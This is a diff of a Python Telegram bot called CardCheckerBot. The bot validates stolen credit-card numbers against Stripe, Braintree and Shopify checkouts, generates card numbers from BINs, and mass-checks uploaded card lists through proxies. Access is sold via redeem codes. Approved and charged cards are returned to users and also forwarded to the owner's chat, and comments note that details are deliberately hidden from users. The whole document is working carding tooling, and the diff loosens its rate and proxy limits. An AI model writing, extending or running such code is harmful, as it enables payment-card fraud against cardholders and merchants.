                     await event.answer("🔒 Admin only.", alert=True)
                     return
-                # FIX: Load good_sites_api.txt into good_sites for reference only
-                # Do NOT override self.working_sites — it must come from working_sites.txt
-                sites_loaded = 0
+                # Load good_sites_api.txt if it exists
+                good_loaded = 0
                 if os.path.exists("good_sites_api.txt"):
                     with open("good_sites_api.txt", "r") as f:
                         good = [l.strip() for l in f if l.strip()]
                     if good:
                         self.good_sites = good
-                        # Re-load working sites from working_sites.txt (source of truth)
-                        loaded = self.load_working_sites_from_file()
-                        if loaded > 0:
-                            self._sites_ready = True
-                            self.precompute_filtered_sites()
-                            sites_loaded = loaded
-                if sites_loaded == 0:
+                        self.working_sites = list(good)
+                        self.site_index = 0
+                        good_loaded = len(good)
+                if good_loaded == 0:
                     await event.edit(
                         "❌ No good sites found. Run <b>Test Sites</b> first.",
                         parse_mode='html',
@@ -3610,7 +2980,7 @@ class CardCheckerBot:
                         "╔══════════════════════════════════════╗\n"
                         "║  ✨ 𝗚𝗢𝗢𝗗 𝗦𝗜𝗧𝗘𝗦 𝗟𝗢𝗔𝗗𝗘𝗗 ✅           ║\n"
                         "╠══════════════════════════════════════╣\n\n"
-                        f"┃ ✅ Loaded: <code>{sites_loaded}</code> good sites\n"
+                        f"┃ ✅ Loaded: <code>{good_loaded}</code> good sites\n"
                         "┃ 💎 Only sites with real payment responses\n"
                         "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛",
                         parse_mode='html',
@@ -3841,6 +3211,9 @@ class CardCheckerBot:
                 )
 
             elif data == "back_main":
+                # Cancel any pending text input mode
+                self.user_text_mode.pop(uid, None)
+                self.user_upload_mode.pop(uid, None)
                 if not self.has_any_access(uid):
                     btns = [[Button.inline("🎟️ 𝗥𝗲𝗱𝗲𝗲𝗺 𝗖𝗼𝗱𝗲 🔑", data="redeem_menu")]]
                     await event.edit(
@@ -3899,7 +3272,365 @@ class CardCheckerBot:
                     btns.append([Button.inline("⚙️ 𝗔𝗱𝗺𝗶𝗻 𝗣𝗮𝗻𝗲𝗹 👑", data="admin")])
                 await event.edit(header, buttons=btns, parse_mode='html')
 
-        # ━━━━━━ TEXT COMMANDS — All removed except /start. Use inline buttons only. ━━━━━━
+        # ━━━━━━ TEXT COMMANDS (admin-only) ━━━━━━
+        @self.bot_client.on(events.NewMessage(pattern=r'/gencode (.+)'))
+        async def gencode_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            code = self.generate_redeem_code(event.pattern_match.group(1).strip())
+            if code:
+                await event.reply(
+                    "╔══════════════════════════════╗\n"
+                    "║   🎟️ CODE GENERATED          ║\n"
+                    "╚══════════════════════════════╝\n\n"
+                    f"🔑 Code: <code>{code}</code>\n"
+                    "🔰 Type: <code>Global Access</code>",
+                    parse_mode='html'
+                )
+
+        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_gencode (.+)'))
+        async def shopify_gencode_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            code = self.generate_shopify_redeem_code(event.pattern_match.group(1).strip())
+            if code:
+                await event.reply(
+                    "╔══════════════════════════════╗\n"
+                    "║   🎟️ CODE GENERATED          ║\n"
+                    "╚══════════════════════════════╝\n\n"
+                    f"🔑 Code: <code>{code}</code>\n"
+                    "🔰 Type: <code>Shopify Access</code>",
+                    parse_mode='html'
+                )
+
+        # ━━━━━━ /shopify_mass_gencode — Mass Generate Shopify Redeem Codes ━━━━━━
+        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_mass_gencode\s+(\d+)\s+(.+)'))
+        async def shopify_mass_gencode_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            count = int(event.pattern_match.group(1))
+            duration = event.pattern_match.group(2).strip()
+            if count < 1 or count > 50:
+                await event.reply("❌ Count must be between 1 and 50.", parse_mode='html')
+                return
+            valid_durations = ["1m", "1h", "1d", "1w", "1month", "perm"]
+            if duration.lower() not in valid_durations:
+                await event.reply(
+                    "❌ Invalid duration. Use one of:\n"
+                    f"<code>{', '.join(valid_durations)}</code>",
+                    parse_mode='html'
+                )
+                return
+            codes = []
+            for _ in range(count):
+                code = self.generate_shopify_redeem_code(duration)
+                if code:
+                    codes.append(code)
+            if not codes:
+                await event.reply("❌ Failed to generate codes.", parse_mode='html')
+                return
+            # Format the codes list
+            dur_display = duration.lower()
+            codes_text = "\n".join(f"<code>{c}</code>" for c in codes)
+            msg = (
+                "╔══════════════════════════════════╗\n"
+                "║  🎟️ MASS CODES GENERATED         ║\n"
+                "╚══════════════════════════════════╝\n\n"
+                f"📊 Count: <b>{len(codes)}</b>\n"
+                f"⏳ Duration: <b>{dur_display}</b>\n"
+                f"🔰 Type: <b>Shopify Access</b>\n\n"
+                f"🔑 Codes:\n{codes_text}\n\n"
+                f"💡 Users redeem with: <code>/redeem CODE</code>"
+            )
+            # If message is too long, send as file
+            if len(msg) > 4000:
+                file_path = f"/tmp/shopify_codes_{dur_display}_{len(codes)}.txt"
+                with open(file_path, 'w') as f:
+                    f.write(f"=== Shopify Redeem Codes ({dur_display}) ===\n")
+                    f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
+                    f.write(f"Count: {len(codes)}\n\n")
+                    for c in codes:
+                        f.write(f"{c}\n")
+                await event.reply(
+                    f"🎟️ Generated {len(codes)} Shopify codes ({dur_display}).\n"
+                    "📎 Codes attached as file:",
+                    file=file_path,
+                    parse_mode='html'
+                )
+            else:
+                await event.reply(msg, parse_mode='html')
+
+        @self.bot_client.on(events.NewMessage(pattern=r'/approve (\d+) (.+)'))
+        async def approve_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            target, dur = int(event.pattern_match.group(1)), event.pattern_match.group(2).strip()
+            ok, msg = await self.approve_user(target, dur)
+            await event.reply(msg)
+
+        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_approve (\d+) (.+)'))
+        async def shopify_approve_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            target, dur = int(event.pattern_match.group(1)), event.pattern_match.group(2).strip()
+            ok, msg = await self.approve_shopify_user(target, dur)
+            await event.reply(msg)
+
+        @self.bot_client.on(events.NewMessage(pattern=r'/shopify_revoke (\d+)'))
+        async def shopify_revoke_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            target = int(event.pattern_match.group(1))
+            if target in self.shopify_users:
+                del self.shopify_users[target]
+                self.save_users()
+                await event.reply(
+                    "╔══════════════════════════════╗\n"
+                    "║   ❌ ACCESS REVOKED           ║\n"
+                    "╚══════════════════════════════╝\n\n"
+                    f"🔒 User <code>{target}</code> Shopify removed",
+                    parse_mode='html'
+                )
+            else:
+                await event.reply(f"❌ User <code>{target}</code> not found", parse_mode='html')
+
+        # ━━━━━━ /test_sites — API-based site validator (admin only) ━━━━━━
+        @self.bot_client.on(events.NewMessage(pattern=r'/test_sites'))
+        async def test_sites_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            sites = list(self.owner_sites) if self.owner_sites else []
+            if not sites:
+                await event.reply("❌ No sites loaded. Upload sites first.")
+                return
+            status_msg = await event.reply(
+                f"🔍 Testing {len(sites)} sites via Flask API...\n"
+                f"⏳ This may take a while ({SHOPIFY_TEST_SITE_TIMEOUT}s timeout per site, retry enabled).\n"
+                f"📋 Strict mode: site must return real payment response (CARD_DECLINED etc.).",
+                parse_mode='html'
+            )
+            try:
+                working, dead = await self.test_sites_graphql(sites)
+                # Auto-load working sites
+                loaded = self.load_working_sites_from_file()
+                fallback_msg = ""
+                if loaded == 0 and self.owner_sites:
+                    self.working_sites = list(self.owner_sites)
+                    self.site_index = 0
+                    self.dead_sites = set()
+                    loaded = len(self.working_sites)
+                    fallback_msg = "\n⚠️ No tested sites passed — using ALL owner sites as fallback."
+                await status_msg.edit(
+                    "╔══════════════════════════════╗\n"
+                    "║   🔍 SITE TEST COMPLETE       ║\n"
+                    "╚══════════════════════════════╝\n\n"
+                    f"✅ Working: <code>{len(working)}</code> (strict: real payment response verified)\n"
+                    f"❌ Dead: <code>{len(dead)}</code>\n"
+                    f"📦 Loaded: <code>{loaded}</code> sites activated\n\n"
+                    f"📝 Saved to <code>working_sites_api.txt</code>{fallback_msg}\n"
+                    "📋 Check bot logs for per-site failure details.",
+                    parse_mode='html'
+                )
+            except Exception as e:
+                await status_msg.edit(f"❌ Error testing sites: <code>{str(e)[:100]}</code>", parse_mode='html')
+
+        # ━━━━━━ /load_working_sites — Load tested working sites (admin only) ━━━━━━
+        @self.bot_client.on(events.NewMessage(pattern=r'/load_working_sites'))
+        async def load_working_sites_cmd(event):
+            if event.sender_id not in ADMINS:
+                return
+            count = self.load_working_sites_from_file()
+            if count > 0:
+                await event.reply(
+                    f"✅ Loaded <code>{count}</code> working sites\n"
+                    "🔄 Active site list replaced.",
+                    parse_mode='html'
+                )
+            else:
+                await event.reply(
+                    "❌ No working sites file found or file is empty.\n"
+                    "Run <code>/test_sites</code> first.",
+                    parse_mode='html'
+                )
+
+        # ━━━━━━ TEXT INPUT HANDLER (button-driven card/bin/gen/redeem) ━━━━━━
+        @self.bot_client.on(events.NewMessage(func=lambda e: e.message.text and not e.message.document))
+        async def text_input_handler(event):
+            uid = event.sender_id
+            mode = self.user_text_mode.get(uid)
+            if not mode:
+                return
+            text = (event.message.text or "").strip()
+            if not text:
+                return
+            # If user sends a command-like message while in text-input mode, cancel and inform them
+            if text.startswith('/'):
+                self.user_text_mode.pop(uid, None)
+                return
+            self.user_text_mode.pop(uid, None)
+
+            # ── Stripe single ──
+            if mode == 'single_stripe':
+                if not self.is_user_approved(uid):
+                    await event.reply("🔒 Access Denied.")
+                    return
+                args = text
+                if not re.match(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", args):
+                    await event.reply("❌ Invalid format. Send: <code>CC|MM|YY|CVV</code>", parse_mode='html')
+                    return
+                status = await event.reply("⚡ <code>𝗦𝘁𝗿𝗶𝗽𝗲 𝗘𝗻𝗴𝗶𝗻𝗲 𝗳𝗶𝗿𝗶𝗻𝗴... 🗡️</code>", parse_mode='html')
+                raw = await self.send_card_to_payu(args, gateway='stripe')
+                self.stats["total_checked"] += 1
+                self.update_user_stats(uid, checked=1)
+                if self.is_approved(raw):
+                    self.stats["total_approved"] += 1
+                    self.update_user_stats(uid, approved=1)
+                    fmt = await self.format_stripe_approved(args, raw)
+                    await self.glowing_success(status, fmt)
+                else:
+                    parts = args.split('|')
+                    await status.edit(
+                        "╔══════════════════════════════════════╗\n"
+                        "║  ❌ 𝗦𝗧𝗥𝗜𝗣𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀            ║\n"
+                        "╚══════════════════════════════╝\n\n"
+                        f"┃ 💳 <code>{args}</code>\n"
+                        f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
+                        f"┃ 🚫 <code>{raw[:80]}</code>\n"
+                        f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
+                        "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
+                        parse_mode='html'
+                    )
+
+            # ── Braintree single ──
+            elif mode == 'single_braintree':
+                if not self.is_user_approved(uid):
+                    await event.reply("🔒 Access Denied.")
+                    return
+                args = text
+                if not re.match(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", args):
+                    await event.reply("❌ Invalid format. Send: <code>CC|MM|YY|CVV</code>", parse_mode='html')
+                    return
+                status = await event.reply("🌐 <code>𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗘𝗻𝗴𝗶𝗻𝗲 𝗳𝗶𝗿𝗶𝗻𝗴... 💉</code>", parse_mode='html')
+                raw = await self.send_card_to_payu(args, gateway='braintree')
+                self.stats["total_checked"] += 1
+                self.update_user_stats(uid, checked=1)
+                if self.is_approved(raw):
+                    self.stats["total_approved"] += 1
+                    self.update_user_stats(uid, approved=1)
+                    fmt = await self.format_braintree_auth(args, raw)
+                    await self.glowing_success(status, fmt)
+                else:
+                    parts = args.split('|')
+                    await status.edit(
+                        "╔══════════════════════════════════════╗\n"
+                        "║  ❌ 𝗕𝗥𝗔𝗜𝗡𝗧𝗥𝗘𝗘 ─ 𝗗𝗘𝗖𝗟𝗜𝗡𝗘𝗗 💀        ║\n"
+                        "╚══════════════════════════════╝\n\n"
+                        f"┃ 💳 <code>{args}</code>\n"
+                        f"┃ 🔢 BIN: <code>{parts[0][:6]}</code>\n"
+                        f"┃ 🚫 <code>{raw[:80]}</code>\n"
+                        f"┃ ⏰ <code>{datetime.now().strftime('%H:%M:%S')}</code>\n\n"
+                        "🔴 <b>Status:</b> <code>DECLINED</code> ❌ — ᴅᴇᴀᴅ ᴄᴀʀᴅ 💀",
+                        parse_mode='html'
+                    )
+
+            # ── Shopify single ──
+            elif mode == 'single_shopify':
+                if not self.is_shopify_approved(uid):
+                    await event.reply("🔒 Shopify Access Denied.")
+                    return
+                parts_txt = text.split()
+                card = parts_txt[0]
+                if not re.match(r"^\d{13,19}\|\d{2}\|\d{2,4}\|\d{3,4}$", card):
+                    await event.reply("❌ Invalid format. Send: <code>CC|MM|YY|CVV</code>", parse_mode='html')
+                    return
+                mode_proxy = "direct"
+                amount_filter = None
+                for p in parts_txt[1:]:
+                    pl = p.lower()
+                    if pl == "proxy":
+                        mode_proxy = "proxy"
+                    elif pl in ("low", "medium", "high", "all"):
+                        amount_filter = pl
+                if amount_filter is None:
+                    amount_filter = self.user_amount_filter.get(uid, "all")
+                status = await event.reply(
+                    "💀 <code>⟦ ꜱʜᴏᴘɪꜰʏ ʀᴇʟᴏᴀᴅᴇᴅ V2 ᴇɴɢɪɴᴇ ꜰɪʀɪɴɢ ᴜᴘ... ⟧</code> ☠️",
+                    parse_mode='html'
+                )
+                approved = False
+                final_info = {"reason": "No response"}
+                used_proxy = None
+                try:
+                    if mode_proxy == "direct":
+                        raw, approved, final_info = await self.shopify_check_card(
+                            card, proxy_str=None, user_id=uid, amount_filter=amount_filter
+                        )
+                    else:
+                        proxies = self.user_proxies.get(uid, [])
+                        if not proxies:
+                            await status.edit("❌ No proxies. Upload first!", parse_mode='html')
+                            return
+                        proxy = await self.get_next_proxy_async(uid)
+                        raw, approved, final_info = await self.shopify_check_card(
+                            card, proxy_str=proxy, user_id=uid, amount_filter=amount_filter
+                        )
+                        used_proxy = proxy
+                except Exception as e:
+                    final_info = {"reason": f"Error: {str(e)}"}
+                if not final_info.get("reason"):
+                    final_info["reason"] = "No response"
+                self.stats["total_checked"] += 1
+                self.update_user_stats(uid, checked=1)
+                if approved:
+                    self.stats["total_approved"] += 1
+                    self.update_user_stats(uid, approved=1)
+                fmt = await self.format_shopify_result(card, approved, final_info, used_proxy)
+                await status.edit(fmt, parse_mode='html')
+
+            # ── BIN lookup ──
+            elif mode == 'bin':
+                if not self.has_any_access(uid):
+                    return
+                if not re.match(r"^\d{6,8}$", text):
+                    await event.reply("❌ Send 6–8 digits only. Example: <code>424242</code>", parse_mode='html')
+                    return
+                await self.bin_search(event.chat_id, text)
+
+            # ── Card generator ──
+            elif mode == 'gen':
+                if not self.has_any_access(uid):
+                    return
+                parts_g = text.split()
+                try:
+                    count = int(parts_g[0])
+                except ValueError:
+                    await event.reply("❌ Send: <code>1000</code> or <code>1000 424242</code>", parse_mode='html')
+                    return
+                bin_input = parts_g[1] if len(parts_g) > 1 else None
+                if count > MAX_CARDS_PER_FILE_STRIPE:
+                    await event.reply(f"❌ Max <code>{MAX_CARDS_PER_FILE_STRIPE:,}</code>", parse_mode='html')
+                    return
+                cards = self.generate_cards(count, bin_input)
+                filepath = os.path.join(STORAGE_DIR, f"gen_{uid}_{uuid.uuid4().hex}.txt")
+                with open(filepath, "w") as f:
+                    f.write("\n".join(cards))
+                await self.bot_client.send_file(event.chat_id, filepath,
+                                                caption=f"🎴 Generated <code>{len(cards):,}</code> cards",
+                                                parse_mode='html')
+                os.remove(filepath)
+
+            # ── Redeem code ──
+            elif mode == 'redeem':
+                code = text.strip().upper()
+                success, typ = await self.redeem_code(uid, code)
+                if not success:
+                    await event.reply(
+                        "╔══════════════════════════════╗\n"
+                        "║      ❌ INVALID CODE          ║\n"
+                        "╚══════════════════════════════╝\n\n"
+                        f"Code <code>{code}</code> not found or expired.",
+                        parse_mode='html'
+                    )
 
         # ━━━━━━ MASS FILE HANDLER ━━━━━━
         @self.bot_client.on(events.NewMessage(func=lambda e: e.message.document))
@@ -3956,7 +3687,6 @@ class CardCheckerBot:
                 # Trust all sites as working — no validation
                 self.working_sites = list(self.owner_sites)
                 self.dead_sites = set()
-                self._save_dead_sites_to_file()
                 self._sites_ready = True
                 await event.reply(
                     "╔══════════════════════════════════════╗\n"
@@ -3974,13 +3704,6 @@ class CardCheckerBot:
                 if not self.is_shopify_approved(uid) and uid not in ADMINS:
                     await event.reply("🔒 Shopify access required.")
                     return
-                # PROXY MANDATORY: require proxies for Shopify mass checks
-                if not self.user_proxies.get(uid):
-                    await event.reply(
-                        "❌ Proxies required for mass checks.\n\n"
-                        "Use \"📎 Upload Proxies\" in the Shopify menu first."
-                    )
-                    return
                 max_cards, gateway, prefix = MAX_CARDS_PER_FILE_SHOPIFY, 'shopify', "🛒 Shopify"
             elif mode == 'stripe':
                 if not self.is_user_approved(uid):
@@ -3991,22 +3714,12 @@ class CardCheckerBot:
                 if not self.is_user_approved(uid):
                     await event.reply("🔒 Access required.")
                     return
-                # DISABLED: Braintree mass checks block the event loop via flood-wait
-                await event.reply(
-                    "⚠️ <b>Braintree mass checks are temporarily disabled.</b>\n\n"
-                    "Reason: Flood-wait from PayU bot causes event loop blocking.\n"
-                    "Use Stripe or Shopify mass checks instead.",
-                    parse_mode='html'
-                )
-                return
+                max_cards, gateway, prefix = MAX_CARDS_PER_FILE_BRAINTREE, 'braintree', "🌐 Braintree"
             else:
                 return
 
-            # SCALABLE: Per-user job limit — max 2 active jobs per user
-            active_user_jobs = sum(1 for job in self.active_jobs.values()
-                                  if job['user_id'] == uid and not job.get('stop'))
-            if active_user_jobs >= 2:
-                await event.reply("❌ You already have 2 active jobs. Wait for them to finish.")
+            if any(job['user_id'] == uid for job in self.active_jobs.values()):
+                await event.reply("❌ You already have an active job.")
                 return
 
             filepath = self.save_cards_file(content, uid, event.chat_id)
@@ -4020,8 +3733,7 @@ class CardCheckerBot:
             if gateway == 'shopify':
                 user_filter = self.user_amount_filter.get(uid, "all")
                 if user_filter != "all":
-                    # FIX: Use ONLY self.working_sites for price validation — no good_sites fallback
-                    base_sites = list(self.working_sites)
+                    base_sites = list(self.good_sites) if self.good_sites else list(self.working_sites)
                     uncached = [s for s in base_sites if s not in self._site_price_cache]
                     if uncached:
                         os.remove(filepath)
@@ -4033,261 +3745,32 @@ class CardCheckerBot:
                         )
                         return
 
-            # ═══════════════ PARALLEL MASS CHECKS ═══════════════
-            # Read all cards from file into memory
-            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
-                all_cards = [line.strip() for line in f if '|' in line.strip()]
-
-            if not all_cards:
-                os.remove(filepath)
-                await event.reply("❌ No valid cards found in file.")
-                return
-
-            total_cards = len(all_cards)
-
-            if gateway == 'shopify' and total_cards > 1:
-                # PARALLEL: Split cards into chunks across workers for maximum throughput
-                num_chunks = min(NUM_WORKERS, total_cards)
-                chunk_size = (total_cards + num_chunks - 1) // num_chunks  # ceil division
-                chunks = [all_cards[i:i + chunk_size] for i in range(0, total_cards, chunk_size)]
-                num_chunks = len(chunks)  # actual number of chunks
-
-                # Initialise aggregated tracking for this user
-                self.user_job_count[uid] = num_chunks
-                self.user_completed_jobs[uid] = 0
-                self.user_aggregated[uid] = {
-                    'total_cards': total_cards, 'processed': 0,
-                    'approved': 0, 'charged': 0, 'declined': 0,
-                    'approved_cards': [], 'charged_cards': [],
-                    'start_time': datetime.now(),
-                }
-                self._user_job_ids[uid] = []
-
-                # Send one shared progress message (all workers update this)
-                # OBFUSCATED: no mention of workers/chunks/parallel
-                msg = await event.reply(
-                    "╔══════════════════════════════════════╗\n"
-                    f"║  🌸 {prefix} 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ⚡         ║\n"
-                    "╠══════════════════════════════════════╣\n\n"
-                    f"    {self.progress_bar(0, total_cards)}\n\n"
-                    f"┃ 📃 Cards: <code>{total_cards:,}</code>\n"
-                    f"┃ ⚡ Engine: <code>Ready</code>",
-                    buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_user_{uid}"),
-                    parse_mode='html'
-                )
-                self._user_progress_msg[uid] = msg.id
-
-                # Create a job for each chunk and queue them
-                for ci, chunk in enumerate(chunks):
-                    job_id = str(uuid.uuid4())
-                    job_entry = {
-                        'cards': chunk, 'user_id': uid, 'chat_id': event.chat_id,
-                        'total': len(chunk), 'processed': 0, 'stop': False,
-                        'message_id': msg.id, 'approved_cards': [], 'charged_cards': [],
-                        'gateway': gateway, 'start_time': datetime.now(),
-                        'declined_count': 0, 'id': job_id,
-                        'filepath': filepath,  # keep reference for cleanup
-                        'parallel': True,       # flag: this is a parallel chunk job
-                        'chunk_index': ci,
-                    }
-                    self.active_jobs[job_id] = job_entry
-                    self._user_job_ids[uid].append(job_id)
-                    await self.task_queue.put(job_entry)
-
-                logger.info(f"[parallel] User {uid}: split {total_cards} cards into {num_chunks} chunks, queued {num_chunks} jobs")
-            else:
-                # Non-parallel path: single job (Stripe, Braintree, or very small Shopify)
-                job_id = str(uuid.uuid4())
-                self.active_jobs[job_id] = {
-                    'cards': all_cards, 'filepath': filepath, 'user_id': uid,
-                    'chat_id': event.chat_id, 'total': total_cards, 'processed': 0,
-                    'stop': False, 'message_id': None, 'approved_cards': [],
-                    'charged_cards': [], 'gateway': gateway,
-                    'start_time': datetime.now(), 'declined_count': 0, 'id': job_id
-                }
-                # OBFUSCATED: no speed shown to user
-                msg = await event.reply(
-                    "╔══════════════════════════════════════╗\n"
-                    f"║  🌸 {prefix} 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ⚡         ║\n"
-                    "╠══════════════════════════════════════╣\n\n"
-                    f"    {self.progress_bar(0, total_cards)}\n\n"
-                    f"┃ 📃 Cards: <code>{total_cards:,}</code>\n"
-                    f"┃ ⚡ Engine: <code>Ready</code>",
-                    buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"),
-                    parse_mode='html'
-                )
-                self.active_jobs[job_id]['message_id'] = msg.id
-                await self.task_queue.put(self.active_jobs[job_id])
+            job_id = str(uuid.uuid4())
+            self.active_jobs[job_id] = {
+                'filepath': filepath, 'user_id': uid, 'chat_id': event.chat_id,
+                'total': cnt, 'processed': 0, 'stop': False, 'message_id': None,
+                'approved_cards': [], 'charged_cards': [], 'gateway': gateway,
+                'start_time': datetime.now(), 'declined_count': 0, 'id': job_id
+            }
+            speed = 1 / DELAY_BETWEEN_CHECKS
+            speed_str = f"{speed:.1f}" if speed < 10 else f"{int(speed)}"
+            msg = await event.reply(
+                "╔══════════════════════════════╗\n"
+                f"║   {prefix} MASS CHECK         ║\n"
+                "╚══════════════════════════════╝\n\n"
+                f"    {self.progress_bar(0, cnt)}\n\n"
+                f"┃ 📃 Cards: <code>{cnt:,}</code>\n"
+                f"┃ ⚡ Speed: <code>{speed_str} cards/sec</code>",
+                buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_{job_id}"),
+                parse_mode='html'
+            )
+            self.active_jobs[job_id]['message_id'] = msg.id
+            await self.task_queue.put(self.active_jobs[job_id])
 
         logger.info("✅ Bot started and listening...")
         await self.bot_client.run_until_disconnected()
 
-    # ═══════════════ Parallel mass check helpers ═══════════════
-
-    async def update_aggregated_progress(self, chat_id: int, msg_id: int, user_id: int):
-        """Update the shared progress message for parallel mass check jobs."""
-        try:
-            async with self._aggregated_lock:
-                agg = self.user_aggregated.get(user_id)
-                if not agg:
-                    return
-                processed = agg['processed']
-                total = agg['total_cards']
-                approved = agg['approved']
-                charged = agg['charged']
-                declined = agg['declined']
-                start_time = agg['start_time']
-
-            bar = self.progress_bar(processed, total)
-            elapsed = datetime.now() - start_time
-            elapsed_secs = elapsed.total_seconds()
-            if processed > 0 and elapsed_secs > 0:
-                avg_per_card = elapsed_secs / processed
-                remaining_secs = (total - processed) * avg_per_card
-            else:
-                remaining_secs = 0
-
-            elapsed_str = str(elapsed).split('.')[0]
-            remaining_str = str(timedelta(seconds=int(remaining_secs))).split('.')[0]
-
-            # OBFUSCATED: no workers, speed, avg shown to user
-            text = (
-                "╔══════════════════════════════════════╗\n"
-                "║  🌸 𝗠𝗔𝗦𝗦 𝗖𝗛𝗘𝗖𝗞 ─ 𝗥𝗨𝗡𝗡𝗜𝗡𝗚 ⚡         ║\n"
-                "╠══════════════════════════════════════╣\n\n"
-                f"    {bar}\n\n"
-                "┌──────── 📊 𝗣𝗿𝗼𝗴𝗿𝗲𝘀𝘀 ──────────┐\n"
-                "│\n"
-                f"│  📃 Done:      <code>{processed}/{total}</code>\n"
-                f"│  💀 Hits:      <code>{approved}</code>\n"
-                f"│  💰 Charged:   <code>{charged}</code>\n"
-                f"│  ❌ Declined:  <code>{declined}</code>\n"
-                f"│  ⏱ Elapsed:   <code>{elapsed_str}</code>\n"
-                f"│  ⏳ ETA:       <code>~{remaining_str}</code>\n"
-                "│\n"
-                "└──────────────────────────────────────┘"
-            )
-            await self.safe_edit_message(chat_id, msg_id, text,
-                                          buttons=Button.inline("⏹ 𝗦𝘁𝗼𝗽 𝗞𝗶𝗹𝗹 🛑", data=f"stop_user_{user_id}"))
-        except Exception:
-            pass
-
-    async def _send_parallel_final_summary(self, chat_id: int, user_id: int, msg_id: int, gateway: str):
-        """Send the final summary when all parallel chunks complete for a user."""
-        try:
-            agg = self.user_aggregated.get(user_id, {})
-            total = agg.get('total_cards', 0)
-            approved_cards = agg.get('approved_cards', [])
-            charged_cards = agg.get('charged_cards', [])
-            declined = agg.get('declined', 0)
-
-            try:
-                user_entity = await self.bot_client.get_entity(user_id)
-                username = user_entity.username or "No username"
-                user_link = f"@{username}" if user_entity.username else f"ID: <code>{user_id}</code>"
-            except Exception:
-                user_link = f"ID: <code>{user_id}</code>"
-
-            if approved_cards:
-                ts = datetime.now().strftime('%Y%m%d_%H%M%S')
-                user_file = os.path.join(PROCESSED_DIR, f"shopify_approved_{user_id}_{ts}.txt")
-                cap = "✅ Shopify Approved"
-
-                with open(user_file, "w") as f:
-                    f.write("\n".join(approved_cards))
-
-                rate = len(approved_cards) / total * 100 if total > 0 else 0
-                rate_w = 10
-                rf = int(rate_w * (rate / 100)) if rate <= 100 else rate_w
-                rate_bar = '█' * rf + '░' * (rate_w - rf)
-
-                summary = (
-                    "╔══════════════════════════════╗\n"
-                    "║   ✅ JOB COMPLETED            ║\n"
-                    "╚══════════════════════════════╝\n\n"
-                    "┏━━━━━ 📊 Results ━━━━━━━━━━┓\n"
-                    f"┃ 📃 Total:    <code>{total:,}</code>\n"
-                    f"┃ ✅ Hits:     <code>{len(approved_cards):,}</code>\n"
-                )
-                if charged_cards:
-                    summary += f"┃ 💰 Charged:  <code>{len(charged_cards):,}</code>\n"
-                summary += (
-                    f"┃ ❌ Declined: <code>{declined:,}</code>\n"
-                    f"┃ 📈 Rate:     <code>[{rate_bar}] {rate:.1f}%</code>\n"
-                    "┗━━━━━━━━━━━━━━━━━━━━━━━━━━━┛"
-                )
-
-                await self.safe_send_message(chat_id, summary)
-                await self.bot_client.send_file(chat_id, user_file, caption=cap)
-                os.remove(user_file)
-
-                owner_file = os.path.join(PROCESSED_DIR, f"owner_{gateway}_{user_id}_{ts}.txt")
-                with open(owner_file, "w") as f:
-                    f.write(f"=== {gateway.upper()} APPROVED ===\n")
-                    f.write(f"User: {user_link}\n")
-                    f.write(f"Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
-                    f.write(f"Hits: {len(approved_cards)}\n{'='*40}\n")
-                    for c in approved_cards:
-                        f.write(f"{c}\n")
-
-                await self.bot_client.send_file(
-                    FORWARD_CHAT_ID, owner_file,
-                    caption=f"📊 {gateway.upper()} | {user_link} | ✅ {len(approved_cards)} hits",
-                    parse_mode='html'
-                )
-                os.remove(owner_file)
-
-                if charged_cards:
-                    cf = os.path.join(PROCESSED_DIR, f"CHARGED_{gateway}_{user_id}_{ts}.txt")
-                    with open(cf, "w") as f:
-                        f.write(f"=== {gateway.upper()} CHARGED ===\n")
-                        f.write(f"User: {user_link}\nCount: {len(charged_cards)}\n{'='*40}\n")
-                        for c in charged_cards:
-                            f.write(f"{c}\n")
-                    await self.bot_client.send_file(
-                        FORWARD_CHAT_ID, cf,
-                        caption=f"💰 {gateway.upper()} CHARGED | {user_link} | {len(charged_cards)} cards",
-                        parse_mode='html'
-                    )
-                    os.remove(cf)
-            else:
-                summary = (
-                    "╔══════════════════════════════╗\n"
-                    "║   ✅ JOB COMPLETED            ║\n"
-                    "╚══════════════════════════════╝\n\n"
-                    f"┃ 📃 Total: <code>{total:,}</code>\n"
-                    f"┃ ❌ Hits:  <code>0</code>\n"
-                    f"┃ 🚫 Declined: <code>{declined:,}</code>\n"
-                    "┃ 📈 Rate: <code>0%</code>"
-                )
-                await self.safe_send_message(chat_id, summary)
-                await self.safe_send_message(FORWARD_CHAT_ID,
-                    f"📊 {gateway.upper()} done | {user_link} | ❌ No hits")
-
-            # Clean up file
-            filepath = None
-            for jid in self._user_job_ids.get(user_id, []):
-                j = self.active_jobs.get(jid)
-                if j and j.get('filepath'):
-                    filepath = j['filepath']
-                    break
-            if filepath:
-                try:
